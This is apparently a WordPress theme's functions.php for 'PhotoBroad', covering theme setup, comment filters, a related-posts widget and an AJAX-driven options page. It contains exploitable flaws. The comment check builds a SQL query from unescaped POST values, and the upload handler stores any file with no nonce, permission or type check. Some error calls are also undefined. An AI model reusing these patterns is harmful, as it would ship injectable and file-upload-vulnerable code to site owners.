<?php
/**
 * Photo Broad functions and definitions.
 *
 * @package M.J
 * @subpackage PhotoBroad
 * @since Photo Broad 1.0
 */

	//add default function
	function PhotoBroad_setup(){

		//Makes PhotoBroad available for translation.
		load_theme_textdomain( 'PhotoBroad', get_template_directory() . '/languages' );
		
		// Adds RSS feed links to <head> for posts and comments.
		add_theme_support( 'automatic-feed-links' );

		// This theme uses a custom image size for featured images, displayed on "standard" posts.
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 210, 9999 ); // Unlimited height, soft crop

		// This theme supports a variety of post formats.
		add_theme_support( 'post-formats', array( 'image', 'video', 'audio' ) ); 

		// This theme uses wp_nav_menu() in one location.
		register_nav_menu( 'primary', 'Primary Menu' );

		/*
		 * This theme supports custom background color and image, and here
		 * we also set up the default background color.
		 */
		add_theme_support( 'custom-background', array(
			'default-color' => 'e9e9e9',
			'default-image' => get_template_directory_uri().'/images/bg.jpg',
		) );

	}
	add_action( 'after_setup_theme', 'PhotoBroad_setup' );

	//Registers our main widget area and the front page widget areas.
	function PhotoBroad_widgets_init(){

		register_widget( 'RelatedPosts' );

		register_sidebar( array(
			'name' => __( 'Main Sidebar', 'PhotoBroad' ),
			'id' => 'sidebar-wrap',
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<h3 class="title">',
			'after_title' => '</h3>',
		) );
		
	}
	add_action( 'widgets_init', 'PhotoBroad_widgets_init' );

	//Registers Link Manager
	add_filter( 'pre_option_link_manager_enabled', '__return_true' );

	
	function PhotoBroad_wp_title( $title, $sep ) {

		global $paged, $page;

		if ( is_feed() )
			return $title;

		// Add the site name.
		$title .= get_bloginfo( 'name' );

		// Add the site description for the home/front page.
		$site_description = get_bloginfo( 'description', 'display' );
		if ( $site_description && ( is_home() || is_front_page() ) )
			$title = "$title $sep $site_description";

		// Add a page number if necessary.
		if ( $paged >= 2 || $page >= 2 )
			$title = "$title $sep " . sprintf( __( 'Page %s', 'PhotoBroad' ), max( $paged, $page ) );

		return $title;
	}
	add_filter( 'wp_title', 'PhotoBroad_wp_title', 10, 2 );
	
	
	//New window opens Comment Link
	function hu_popuplinks($text) {
		$text = preg_replace('/<a (.+?)>/i', "<a $1 target='_blank'>", $text);
		return $text;
	}
	add_filter('get_comment_author_link', 'hu_popuplinks', 6);

	//To anti in English comment spam
	function scp_comment_post( $incoming_comment ) {
		$pattern = '/[一-龥]/u';
		if(!preg_match($pattern, $incoming_comment['comment_content'])) {
			err( __('You should type some Chinese word (like "Hello") in your comment to pass the spam-check, thanks for your patience! Your comment must contain Chinese characters!', 'PhotoBroad') );
		}
		return( $incoming_comment );
	}
	add_filter('preprocess_comment', 'scp_comment_post');
	
	
	/**
	 * when comment check the comment_author comment_author_email
	 * @param unknown_type $comment_author
	 * @param unknown_type $comment_author_email
	 * @return unknown_type
	 * Prevent visitors posing bloggers comment 
	 */
	function CheckEmailAndName(){
		global $wpdb;
		$comment_author       = ( isset($_POST['author']) )  ? trim(strip_tags($_POST['author'])) : null;
		$comment_author_email = ( isset($_POST['email']) )   ? trim($_POST['email']) : null;
		if(!$comment_author || !$comment_author_email){
			return;
		}
		$result_set = $wpdb->get_results("SELECT display_name, user_email FROM $wpdb->users WHERE display_name = '" . $comment_author . "' OR user_email = '" . $comment_author_email . "'");
		if ($result_set) {
			if ($result_set[0]->display_name == $comment_author){
				err( __( 'Warning: You can not use this nickname, because this is the nickname of the bloggers!', 'PhotoBroad' ) );
			}else{
				err( __( 'Warning: You can not use the mailbox, because this is the mailbox of the bloggers!', 'PhotoBroad') );
			}
			fail($errorMessage);
		}
	}
	add_action('pre_comment_on_post', 'CheckEmailAndName');
	
	
	//Replace the default expression
	function custom_smilies_src($img_src,$img,$siteurl) {
		return get_bloginfo('template_directory').'/images/smilies/'.$img;
	}
	add_filter('smilies_src','custom_smilies_src',1,10);
	
	
	//phzoom
	function phzoom( $content ){
		return preg_replace( '/<a(.*?)href=(.*?).(bmp|gif|jpeg|jpg|png)"(.*?)>/i', '<a$1href=$2.$3" $4 class="phzoom">', $content );
	}
	add_filter( 'the_content', 'phzoom', 2 );

	/**
	 * Get Post Thumb img
	 * @author M.J
	 * @return string 
	 */
	function get_post_thumb( $return_src = 'true' ){
		global $post, $posts;
		$content = $post->post_content;
		$pattern = '/<img.+src=[\'"]([^\'"]+)[\'"].*>/i';
		$result = preg_match_all( $pattern, $content, $matches );
		if ( $return_src == 'true' ){
			if ( !empty( $result ) ){
				$imgResult = '<img src="'.get_bloginfo("template_url").'/timthumb.php?src='.$matches[1][0].'&amp;q=100&amp;w=210" alt="" />';
			}
		} else {
			$imgResult = $matches[1][0];
		}
		return $imgResult;
	}
	
	
	/**
	 * Get Main Layout
	 * @author M.J
	 * @return string 
	 */
	 function get_main_layout( $layoutType = 'primary' ){
		$PhotoBroad_values = get_option('PhotoBroad_framework_values');
		if ( !is_array( $PhotoBroad_values ) ) $PhotoBroad_values = array();
		if( array_key_exists('style_main_layout', $PhotoBroad_values) && !empty( $PhotoBroad_values['style_main_layout'] ) ){
			if ( $PhotoBroad_values['style_main_layout'] == 'layout-2cr' ){
				if ( $layoutType == 'primary' ){
					$layout = 'float:left;';
				} else {
					$layout = 'float:right;';
				}
			} else {
				if ( $layoutType == 'primary' ){
					$layout = 'float:right;';
				} else {  
					$layout = 'float:left;';
				}
			}
		}
		return $layout;
	 }
	 
	
	/**
	 * Get Post Text length
	 * @author M.J
	 * @return number 
	 */
	function get_text_length( $strType = 'image' ){
		$PhotoBroad_values = get_option('PhotoBroad_framework_values');
		if ( !is_array( $PhotoBroad_values ) ) $PhotoBroad_values = array();
		if ( $strType == 'image' ){
			if( array_key_exists('image_text_length', $PhotoBroad_values) && !empty( $PhotoBroad_values['image_text_length'] ) ){
				$lenstr = intval( $PhotoBroad_values['image_text_length'] );
				if ( $lenstr == 0 ){
					$lenstr = 150;
				}
			} else {
				$lenstr = 150;
			}
		} else {
			if( array_key_exists('text_length', $PhotoBroad_values) && !empty( $PhotoBroad_values['text_length'] ) ){
				$lenstr = intval( $PhotoBroad_values['text_length'] );
				if ( $lenstr == 0 ){
					$lenstr = 300;
				}
			} else {
				$lenstr = 300;
			}
		}
		return $lenstr;
	}
?>
<?php
	/**
	 * Template for comments and pingbacks.
	 *
	 * To override this walker in a child theme without modifying the comments template
	 * simply create your own PhotoBroad_comment(), and that function will be used instead.
	 */
	function PhotoBroad_comment($comment, $args, $depth) {
		$GLOBALS['comment'] = $comment; 
?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
	<div class="comment-body clearfix" id="comment-<?php comment_ID(); ?>">
		<?php echo get_avatar( $comment, $size='48' ); ?>
		<div class="comment-wrap">
			<div class="comment-author clearfix">
				<span class="reply-container">
					<?php comment_reply_link(array_merge( $args, array('reply_text' => __('Reply ','PhotoBroad' ), 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
					<?php edit_comment_link(__(' Edit ', 'PhotoBroad'),'  ','') ?>
					<span class="comment-meta commentmetadata"><?php echo(get_comment_date()) ?></span>
				</span>
				<span id="reviewer-<?php echo comment_ID(); ?>"><?php printf('%s', get_comment_author_link()) ?></span>
			</div>
			<div class="comment-content"><?php comment_text() ?></div>
		</div>
	</div>
<?php
	}
	require_once( TEMPLATEPATH . '/include/metaboxclass.php' );
	//add post.php MetaBox
	set_metaBox();

	//Default Set MetaBox
	function set_metaBox(){
		$options = array();
		$metaBox = array();
		$options['audio'] = array(
			'title' => array( 
				"name" => __("These settings enable you to embed audio into your posts. You must provide both .mp3 and .agg/.oga file formats in order for self hosted audio to function accross all browsers." , 'PhotoBroad'),
				"type" => "title"
				),
			'file' => array(
				"name" => __( "MP3 File URL" , 'PhotoBroad' ),
				"desc" => __( "The URL to the .mp3 audio file" , 'PhotoBroad' ),
				"id" => "PhotoBroad_File",
				"size"=>"40",
				"std" => "",
				"type" => "text"
				),
			'level' => array(
				"name" => __( "MP3 Level" , 'PhotoBroad' ),
				"desc" => __( "Used here &hearts; fill" , 'PhotoBroad' ),
				"id" => "PhotoBroad_Level",
				"size"=>"40",
				"std" => "",
				"type" => "text"
				),
			'author' => array(
				"name" => __( "MP3 Author" , 'PhotoBroad' ),
				"desc" => __( "Here to fill in the name of the artist" , 'PhotoBroad' ),
				"id" => "PhotoBroad_Author",
				"size"=>"40",
				"std" => "",
				"type" => "text"
				),
			'musicablum' => array(
				"name" => __( "MP3 Album" , 'PhotoBroad' ),
				"desc" => __( "Here to fill out the album name" , 'PhotoBroad' ),
				"id" => "PhotoBroad_Album",
				"size"=>"40",
				"std" => "",
				"type" => "text"
				),
			'image' => array(
				"name" => __( "Audio Poster Image", 'PhotoBroad' ),
				"desc" => __( "The preview image for this audio track. Image width should be 210px.", 'PhotoBroad' ),
				"id" => "PhotoBroad_audio_upimg",
				"std" => "",
				"button_label"=> __( 'Upload Image' , 'PhotoBroad' ),
				"type" => "media"
			)
		);

		$options['video'] = array(
			'title' => array( 
				"name" => __("These settings enable you to embed videos into your posts." , 'PhotoBroad'),
				"type" => "title"
				),
			'image' => array(
				"name" => __( "Poster Image", 'PhotoBroad' ),
				"desc" => __( "The preview image for this audio track. Image width should be 210px.", 'PhotoBroad' ),
				"id" => "PhotoBroad_video_upimg",
				"std" => "",
				"button_label"=> __( 'Upload Image' , 'PhotoBroad' ),
				"type" => "media"
			),
			'code' => array(
				"name" => __( "Embedded Code", 'PhotoBroad' ),
				"desc" => __( "If you are using something other than self hosted video such as Youtube or Vimeo, paste the embed code here. Width is best at 500px with any height.", 'PhotoBroad' ),
				"id" => "PhotoBroad_code",
				"std" => "",
				"type" => "textarea"
			)
		);

		$audio = array( 'title' => __( 'Audio Settings' , 'PhotoBroad' ), 'id'=>'metaBox-post-format-audio', 'page'=>array('post'), 'context'=>'normal', 'priority'=>'low', 'callback'=>'' );
		$video = array( 'title' => __( 'Video Settings' , 'PhotoBroad' ), 'id'=>'metaBox-post-format-video', 'page'=>array('post'), 'context'=>'normal', 'priority'=>'low', 'callback'=>'' );
		$new_box = new ashu_meta_box( $options['audio'], $audio );
		$new_box = new ashu_meta_box( $options['video'], $video );

	}
	
	//Registers widgets
	class RelatedPosts extends WP_Widget {
		
		function RelatedPosts(){
			$widget_ops = array( 'classname'=>'widge_pic', 'description'=> __( 'This is a tool to display related posts displayed in picture form', 'PhotoBroad' ) , 'Related' );
			$control_ops = array( 'width'=>250 );
			$this->WP_Widget( 'Related', __( 'Related Posts', 'PhotoBroad' ), $widget_ops, $control_ops );
		}

		function widget( $args, $instance ){
			extract($args, EXTR_SKIP);
			$title = apply_filters( 'widget_title', empty( $instance['title'] ) ? '' : $instance['title'], $instance, $this->id_base );
			$posts_orderby = apply_filters( 'widget_title', empty( $instance['posts_orderby'] ) ? 'new' : $instance['posts_orderby'], $instance, $this->id_base );
			echo $before_widget;
			if ( !empty( $title ) ) { echo $before_title . $title . $after_title; }
			if ( $posts_orderby == 'new' ){
				query_posts('orderby=desc&showposts=9');
			} else {
				foreach(get_the_category() as $category){
					$cat = $category->cat_ID;
				}
				query_posts('cat=' . $cat . '&orderby=rand&showposts=9');
			}
			echo '<ul class="clearfix widget_img">';
			while (have_posts()) : the_post();
				$img_thumbnail = get_the_post_thumbnail( $post->ID, 'thumbnail' );
				$pattern = '/<img.+src=[\'"]([^\'"]+)[\'"].*>/i';
				$result = preg_match_all( $pattern, $img_thumbnail, $matches );
				if ( empty( $img_thumbnail ) ) {
						$format = get_post_format();
						switch ( $format ) {
							case 'audio':
								$input = 'PhotoBroad_audio_upimg';
								break;
							case 'video':
								$input = 'PhotoBroad_video_upimg';
								break;
						}
						$img_meta = get_post_meta( $post->ID, $input, true );
						if ( empty( $img_meta ) ){
							$img_content = get_post_thumb( 'false' );
							if ( !empty( $img_content ) ){
								$img = get_bloginfo("template_url").'/timthumb.php?src='.$img_content.'&amp;q=100&amp;w=60&amp;h=60';
							} else {
								$img = get_bloginfo("template_url").'/images/noresult.png';
							}
						} else {
							$img = get_bloginfo("template_url").'/timthumb.php?src='.$img_meta.'&amp;q=100&amp;w=60&amp;h=60';
						}
				} else {
					if ( !empty( $result ) ){
						$img = get_bloginfo("template_url").'/timthumb.php?src='.$matches[1][0].'&amp;q=100&amp;w=60&amp;h=60';
					}
				}
?>
			<li>
				<a href="<?php the_permalink(); ?>" title="<?php the_title(); ?>">
					<img src="<?php echo $img; ?>" width="60" height="60" alt="<?php the_title(); ?>" title="<?php the_title(); ?>" />
				</a>
			</li>
<?php
			endwhile; wp_reset_query();
			echo '</ul>';
			echo $after_widget;
		}

		function update( $new_instance, $old_instance ){
			$instance = $old_instance;
			$instance['title'] = strip_tags($new_instance['title']);
			$instance['posts_orderby'] = strip_tags($new_instance['posts_orderby']);
			return $instance;
		}

		function form( $instance ){
			$title = strip_tags( $instance['title'] );
			$posts_orderby = strip_tags( $instance['posts_orderby'] )
?>
			<p>
				<label for="<?php echo $this->get_field_id('title'); ?>"><?php _e( 'Title:' , 'PhotoBroad' ); ?></label>
				<input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo esc_attr($title); ?>" />
			</p>
			<p>
				<label for="<?php echo $this->get_field_id('posts_orderby'); ?>"><?php _e( 'Sort by:', 'PhotoBroad' ); ?></label>
				<select name="<?php echo $this->get_field_name('posts_orderby'); ?>" id="<?php echo $this->get_field_id('posts_orderby'); ?>" class="widefat">
					<option value="new"<?php selected( $posts_orderby, 'new' ); ?>><?php _e( 'New Posts', 'PhotoBroad' ); ?></option>
					<option value="related"<?php selected( $posts_orderby, 'related' ); ?>><?php _e( 'Related Posts', 'PhotoBroad' ); ?></option>
				</select>
			</p>
<?php 
		}
	}
	
	
	/**
	 * Load admin CSS
	 */
	function PhotoBroad_admin_styles() {
		wp_enqueue_style('PhotoBroad_admin_css', get_bloginfo('template_directory') .'/include/photobroad-admin.css');
		wp_enqueue_style('PhotoBroad_jgrowl', get_bloginfo('template_directory') .'/include/jgrowl/jquery.jgrowl.css');
		wp_enqueue_style('farbtastic');
	}
	add_action('admin_print_styles', 'PhotoBroad_admin_styles');
	
	
	/**
	 * Load admin JS
	 */
	function PhotoBroad_admin_scripts() {
		wp_register_script('PhotoBroad-ajaxupload', get_bloginfo('template_directory') .'/include/ajaxupload.js', array('jquery'));
		wp_enqueue_script('PhotoBroad-ajaxupload');  
		wp_register_script('PhotoBroad-jgrowl', get_bloginfo('template_directory') .'/include/jgrowl/jquery.jgrowl_min.js', array('jquery'));
		wp_enqueue_script('PhotoBroad-jgrowl'); 
		wp_register_script('PhotoBroad-framework-admin', get_bloginfo('template_directory') .'/include/admin.js', array('jquery','farbtastic'));
		wp_enqueue_script('PhotoBroad-framework-admin'); 
		wp_enqueue_script('jquery');
		wp_enqueue_style('farbtastic');
	}
	add_action('admin_enqueue_scripts', 'PhotoBroad_admin_scripts');
	
	//theme setting
	function PhotoBroad_setting(  ){
		$PhotoBroad_values = get_option('PhotoBroad_framework_values');
		if ( !is_array( $PhotoBroad_values ) ){
			$PhotoBroad_values = array();
		}
?>
		<div id="PhotoBroad-framework" class="clearfix">
			<form action="<?php echo site_url() .'/wp-admin/admin-ajax.php'; ?>" method="post">
				<div class="header clearfix">
					<a href="http://photobroad.webjyh.com" target="_blank" class="PhotoBroad-logo">
						<img src="<?php echo get_bloginfo('template_directory'); ?>/images/logo.png" alt="M.J" />
					</a>
					<h1 class="theme-name">PhotoBroad</h1>
					<span class="theme-version">v.1.0</span>
					<ul class="theme-links">
						<li><a href="http://mail.163.com/share/mail2me.htm#email=106105097110103121097104097105064049054051046099111109" target="_blank" class="forums"><?php _e( 'Write to the author', 'PhotoBroad' ); ?></a></li>
						<li><a href="http://webjyh.com" target="_blank" class="themes"><?php _e( 'Author Home', 'PhotoBroad' ); ?></a></li>
					</ul>
				</div>
				<div class="main clearfix">
					<div class="nav">
						<ul>
							<li><a href="#general-settings"><?php _e( 'General Settings', 'PhotoBroad' ); ?></a></li>
							<li><a href="#styling-options"><?php _e( 'Styling Options', 'PhotoBroad' ); ?></a></li>
						</ul>
					</div>
					<div class="content">
						<div id="page-general-settings" class="page">
							<h2><?php _e( 'General Settings', 'PhotoBroad' ); ?></h2>
							<p class="page-desc"><?php _e( 'Control and configure the general setup of your theme. Upload your preferred logo, setup your text length and insert your analytics tracking code.', 'PhotoBroad' ) ?></p>
							<div class="section ">
								<h3><?php _e( 'Plain Text Logo', 'PhotoBroad' ); ?></h3>
								<div class="desc"><?php _e( 'Check this box to enable a plain text logo rather than upload an image. Will use your site name.', 'PhotoBroad' ); ?> </div>
								<div class="input checkbox">
								<?php
									if(array_key_exists( 'general_text_logo' , $PhotoBroad_values ) && $PhotoBroad_values['general_text_logo'] == 'on') $val = ' checked="yes"';
									if(array_key_exists( 'general_text_logo' , $PhotoBroad_values ) && $PhotoBroad_values['general_text_logo'] != 'on') $val = '';
									echo '<input type="hidden" name="settings[general_text_logo]" value="off" />
									<input type="checkbox" id="general_text_logo" name="settings[general_text_logo]" value="on"'. $class . $val .' /> ';
								?>
								</div>
								<div class="PhotoBroad-clear"></div>
							</div>
							<div class="section ">
								<h3><?php _e( 'Custom Logo Upload', 'PhotoBroad' ); ?></h3>
								<div class="desc"><?php _e( 'Upload a logo for your theme.', 'PhotoBroad' ); ?> </div>
								<div class="input file">
									<?php 
										$wp_uploads = wp_upload_dir();
									?>
									<div class="ajax-uploaded" id="uploaded_general_custom_logo">
										<?php 
											if(array_key_exists( 'general_custom_logo' , $PhotoBroad_values)){
												$ext = substr( $PhotoBroad_values['general_custom_logo'], strrpos($PhotoBroad_values['general_custom_logo'], '.') + 1 );
												if($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg' || $ext == 'gif'){
													echo '<img src="'. $PhotoBroad_values['general_custom_logo'] .'" alt="" />'; 
												} else {
													echo $PhotoBroad_values['general_custom_logo']; 
												}
											}
										?>
									</div>
									<a class="button-secondary " id="ajax_upload_general_custom_logo" href="#"><?php _e( 'Upload Image', 'PhotoBroad' ); ?></a>
									<a class="button-secondary" id="ajax_remove_general_custom_logo" href="#" <?php if( !array_key_exists( 'general_custom_logo' , $PhotoBroad_values )){ echo ' style="display:none"'; } ?>><?php _e( 'Remove', 'PhotoBroad' ); ?></a>
								</div>
								<script type="text/javascript">
								jQuery(document).ready(function($){ 
									var button = $('#ajax_upload_general_custom_logo');
									var buttonVal = button.text();
									var interval = '';
									// AJAX upload
									new AjaxUpload(button, {
										action: '<?php echo site_url(); ?>/wp-admin/admin-ajax.php',
										data: { action:'PhotoBroad_ajax_upload', data:'general_custom_logo' },
										onSubmit : function(file, ext){
											button.text('Uploading');
											this.disable();
											
											 // Uploding -> Uploading. -> Uploading...
											interval = window.setInterval(function(){
												var text = button.text();
												if (text.length < 13){
													button.text(text + '.');
												} else {
													button.text('Uploading');
												}
											}, 200);
										},
										onComplete: function(file, response){
											button.text(buttonVal);
											this.enable();
											window.clearInterval(interval);
											
											// Show image
											$('#uploaded_general_custom_logo').html('');
											var ext = file.substr(file.lastIndexOf(".")+1,file.length);
											if(ext && /^(jpg|png|jpeg|gif)$/.test(ext)){
												$('#uploaded_general_custom_logo').html('<img src="<?php echo $wp_uploads['url']; ?>/' + file + '" alt="" />');
											} else {
												$('#uploaded_general_custom_logo').text('<?php echo $wp_uploads['url']; ?>/' + file);
											}
											$('#ajax_remove_general_custom_logo').show();
										}
									});
									
									var remove = $('#ajax_remove_general_custom_logo');
									remove.bind('click', function(){
										remove.text('Removing...');
										$.post('<?php echo site_url(); ?>/wp-admin/admin-ajax.php', 
											{ action:'PhotoBroad_ajax_remove', data:'general_custom_logo' }, 
											function(data){
												remove.fadeOut(500, function(){
													remove.text('Remove');
												});
												$('#uploaded_general_custom_logo').html('');
											}
										);
										return false;
									});
								});
								</script>
								<div class="PhotoBroad-clear"></div>
							</div>
							<div class="section ">
								<h3><?php _e( 'Custom Favicon Upload' , 'PhotoBroad' ); ?></h3>
								<div class="desc"><?php _e( "Upload a 16px x 16px Png/Gif image that will represent your website's favicon." , "PhotoBroad" ); ?></div>
								<div class="input file">
									<?php 
										$wp_uploads = wp_upload_dir();
									?>
									<div class="ajax-uploaded" id="uploaded_general_custom_favicon">
										<?php 
											if(array_key_exists( 'general_custom_favicon' , $PhotoBroad_values)){
												$ext = substr( $PhotoBroad_values['general_custom_favicon'], strrpos($PhotoBroad_values['general_custom_favicon'], '.') + 1 );
												if($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg' || $ext == 'gif'){
													echo '<img src="'. $PhotoBroad_values['general_custom_favicon'] .'" alt="" />'; 
												} else {
													echo $PhotoBroad_values['general_custom_favicon']; 
												}
											}
										?>
									</div>
									<a class="button-secondary" id="ajax_upload_general_custom_favicon" href="#"><?php _e( 'Upload Image', 'PhotoBroad' ); ?></a>
									<a class="button-secondary" id="ajax_remove_general_custom_favicon" href="#" <?php if( !array_key_exists( 'general_custom_favicon' , $PhotoBroad_values )){ echo ' style="display:none"'; } ?>><?php _e( 'Remove', 'PhotoBroad' ); ?></a>
								</div>
								<script type="text/javascript">
								jQuery(document).ready(function($){ 
									var button = $('#ajax_upload_general_custom_favicon');
									var buttonVal = button.text();
									var interval = '';
									// AJAX upload
									new AjaxUpload(button, {
										action: '<?php echo site_url(); ?>/wp-admin/admin-ajax.php',
										data: { action:'PhotoBroad_ajax_upload', data:'general_custom_favicon' },
										onSubmit : function(file, ext){
											button.text('Uploading');
											this.disable();
											
											 // Uploding -> Uploading. -> Uploading...
											interval = window.setInterval(function(){
												var text = button.text();
												if (text.length < 13){
													button.text(text + '.');
												} else {
													button.text('Uploading');
												}
											}, 200);
										},
										onComplete: function(file, response){
											button.text(buttonVal);
											this.enable();
											window.clearInterval(interval);
											
											// Show image
											$('#uploaded_general_custom_favicon').html('');
											var ext = file.substr(file.lastIndexOf(".")+1,file.length);
											if(ext && /^(jpg|png|jpeg|gif)$/.test(ext)){
												$('#uploaded_general_custom_favicon').html('<img src="<?php echo $wp_uploads['url']; ?>/' + file + '" alt="" />');
											} else {
												$('#uploaded_general_custom_favicon').text('<?php echo $wp_uploads['url']; ?>/' + file);
											}
											$('#ajax_remove_general_custom_favicon').show();
										}
									});
									
									var remove = $('#ajax_remove_general_custom_favicon');
									remove.bind('click', function(){
										remove.text('Removing...');
										$.post('<?php echo site_url(); ?>/wp-admin/admin-ajax.php', 
											{ action:'PhotoBroad_ajax_remove', data:'general_custom_favicon' }, 
											function(data){
												remove.fadeOut(500, function(){
													remove.text('Remove');
												});
												$('#uploaded_general_custom_favicon').html('');
											}
										);
										return false;
									});
								});
								</script>
								<div class="PhotoBroad-clear"></div>
							</div>
							<div class="section ">
								<h3><?php _e( 'Text length' , 'PhotoBroad' ) ?></h3>
								<div class="desc"><?php _e( 'Set the plain text of the article text length.' , 'PhotoBroad' ) ?></div>
								<div class="input text"><input type="text" value="<?php  if(array_key_exists('text_length', $PhotoBroad_values)) echo $PhotoBroad_values['text_length']; ?>" name="settings[text_length]" id="text_length"></div>
								<div class="PhotoBroad-clear"></div>
							</div>
							<div class="section ">
								<h3><?php _e( 'Image text length' , 'PhotoBroad' ) ?></h3>
								<div class="desc"><?php _e( 'Set contains a picture text article text length.' , 'PhotoBroad' ) ?></div>
								<div class="input text"><input type="text" value="<?php  if(array_key_exists('image_text_length', $PhotoBroad_values)) echo $PhotoBroad_values['image_text_length']; ?>" name="settings[image_text_length]" id="image_text_length"></div>
								<div class="PhotoBroad-clear"></div>
							</div>
							<div class="section tracking-code">
								<h3><?php _e( 'Tracking Code' , 'PhotoBroad' ) ?></h3>
								<div class="desc"><?php _e( 'Paste your Google Analytics (or other) tracking code here. It will be inserted before the closing body tag of your theme.' , 'PhotoBroad' ) ?></div>
								<div class="input textarea"><textarea name="settings[general_tracking_code]" id="general_tracking_code"><?php
										if(array_key_exists('general_tracking_code', $PhotoBroad_values)) {
											echo stripslashes( $PhotoBroad_values['general_tracking_code'] );
										};
									?></textarea>
								</div>
								<div class="PhotoBroad-clear"></div>
							</div>
						</div>
						<div id="page-styling-options" class="page">
							<h3><?php _e( 'Styling Options' , 'PhotoBroad' ) ?></h3>
							<div class="desc"><?php _e( 'Configure the visual appearance of you theme by selecting a stylesheet if applicable, choosing your overall layout and inserting any custom CSS necessary.' , 'PhotoBroad' ) ?></div>
							<div class="section main-layout">
								<h3><?php _e( 'Main Layout' , 'PhotoBroad' ) ?></h3>
								<div class="desc"><?php _e( 'Select main content and sidebar alignment.' , 'PhotoBroad' ) ?></div>
								<div class="input radio">
									<?php
										if ( array_key_exists('style_main_layout', $PhotoBroad_values) ){
									?>
										<label for="style_main_layout_0" class="layout-2cr">
											<input type="radio" value="layout-2cr" name="settings[style_main_layout]" id="style_main_layout_0" <?php if ( $PhotoBroad_values['style_main_layout'] == 'layout-2cr' ){ echo 'checked="checked"'; } ?> /> 2 Columns (right)
										</label>
										<label for="style_main_layout_1" class="layout-2cl">
											<input type="radio" value="layout-2cl" name="settings[style_main_layout]" id="style_main_layout_1" <?php if ( $PhotoBroad_values['style_main_layout'] == 'layout-2cl' ){ echo 'checked="checked"'; } ?> /> 2 Columns (left)
										</label>
									<?php
										} else {
									?>
										<label for="style_main_layout_0" class="layout-2cr">
											<input type="radio" value="layout-2cr" name="settings[style_main_layout]" id="style_main_layout_0" checked="checked" /> 2 Columns (right)
										</label>
										<label for="style_main_layout_1" class="layout-2cl">
											<input type="radio" value="layout-2cl" name="settings[style_main_layout]" id="style_main_layout_1" /> 2 Columns (left)
										</label>
									<?php
										}
									?>
								</div>
								<div class="PhotoBroad-clear"></div>
							</div>
							<div class="section custom-css">
								<h3><?php _e( 'Custom CSS' , 'PhotoBroad' ) ?></h3>
								<div class="desc"><?php _e( 'Quickly add some CSS to your theme by adding it to this block.' , 'PhotoBroad' ) ?></div>
								<div class="input textarea">
									<textarea name="settings[style_custom_css]" id="style_custom_css"><?php
										if(array_key_exists('style_custom_css', $PhotoBroad_values)) {
											echo stripslashes( $PhotoBroad_values['style_custom_css'] );
										};
									?></textarea>
								</div>
								<div class="PhotoBroad-clear"></div>
							</div>
						</div>
					</div>
					<div class="PhotoBroad-clear"></div>
				</div>
				<div class="footer clearfix">
					<input type="hidden" value="PhotoBroad_framework_save" name="action">
					<input type="hidden" value="<?php echo wp_create_nonce('PhotoBroad_framework_options'); ?>" id="PhotoBroad_noncename" name="PhotoBroad_noncename">
					<input type="button" id="reset-button" class="button" value="<?php _e( 'Reset Options' , 'PhotoBroad' ) ?>">
					<input type="submit" id="save-button" class="button-primary" value="<?php _e( 'Save All Changes' , 'PhotoBroad' ) ?>">
				</div>
			</form>
		</div>
<?php
	}
	
	/**
	 * AJAX Save Options
	 */
	function PhotoBroad_framework_save(){
		$response['error'] = false;
		$response['message'] = '';
		$response['type'] = '';
		
		// Verify this came from the our screen and with proper authorization
		if(!isset($_POST['PhotoBroad_noncename']) || !wp_verify_nonce($_POST['PhotoBroad_noncename'], plugin_basename('PhotoBroad_framework_options'))){
			$response['error'] = true;
			$response['message'] = __('You do not have sufficient permissions to save these options.', 'PhotoBroad' );
			echo json_encode($response);
			die;
		}
				
		$PhotoBroad_values = get_option('PhotoBroad_framework_values');
		foreach( $_POST['settings'] as $key => $val ){
			$PhotoBroad_values[$key] = $val;
		}
		
		$PhotoBroad_values = apply_filters( 'PhotoBroad_framework_save', $PhotoBroad_values ); // Pre save filter
		
		update_option('PhotoBroad_framework_values', $PhotoBroad_values);
		
		$response['message'] = __( 'Settings saved', 'PhotoBroad' );    
		echo json_encode($response);
		die;
	}
	add_action('wp_ajax_PhotoBroad_framework_save', 'PhotoBroad_framework_save');

	/**
	 * AJAX Reset Options
	 */
	function PhotoBroad_framework_reset(){
		$response['error'] = false;
		$response['message'] = '';
		
		// Verify this came from the our screen and with proper authorization
		if(!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], plugin_basename('PhotoBroad_framework_options'))){
			$response['error'] = true;
			$response['message'] = __('You do not have sufficient permissions to reset these options.', 'PhotoBroad' );
			echo json_encode($response);
			die;
		}
				
		update_option('PhotoBroad_framework_values', array());
		  
		echo json_encode($response);
		die;
	}
	add_action('wp_ajax_PhotoBroad_framework_reset', 'PhotoBroad_framework_reset');

	/**
	 * Framework AJAX upload
	 */
	function PhotoBroad_ajax_upload(){
		$response['error'] = false;
		$response['message'] = '';
		
		$wp_uploads = wp_upload_dir();
		$uploadfile = $wp_uploads['path'] .'/'. basename($_FILES['userfile']['name']);

		if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
			$PhotoBroad_values = get_option('PhotoBroad_framework_values');
			$PhotoBroad_values[$_POST['data']] = $wp_uploads['url'] .'/'. basename($_FILES['userfile']['name']);
			update_option('PhotoBroad_framework_values', $PhotoBroad_values);
			$response['message'] =  'success';
		} else {
			$response['error'] = true;
			$response['message'] =  'error'; 
		}
		
		echo json_encode($response);
		die;
	}
	add_action('wp_ajax_PhotoBroad_ajax_upload', 'PhotoBroad_ajax_upload');

	/**
	 * Framework AJAX remove upload
	 */
	function PhotoBroad_ajax_remove(){
		$response['error'] = false;
		$response['message'] = '';
		
		$data = $_POST['data'];

		$PhotoBroad_values = get_option('PhotoBroad_framework_values');
		unset($PhotoBroad_values[$_POST['data']]);
		update_option('PhotoBroad_framework_values', $PhotoBroad_values);
		$response['message'] =  'success';
		
		echo json_encode($response);
		die;
	}
	add_action('wp_ajax_PhotoBroad_ajax_remove', 'PhotoBroad_ajax_remove');
    
	function theme_page(){
		add_theme_page( 
			__('Theme Options'),
			__('Theme Options'), 
			__('edit_themes'), 
			basename(__FILE__), 'PhotoBroad_setting' 
		);
	}
	add_action('admin_menu','theme_page');
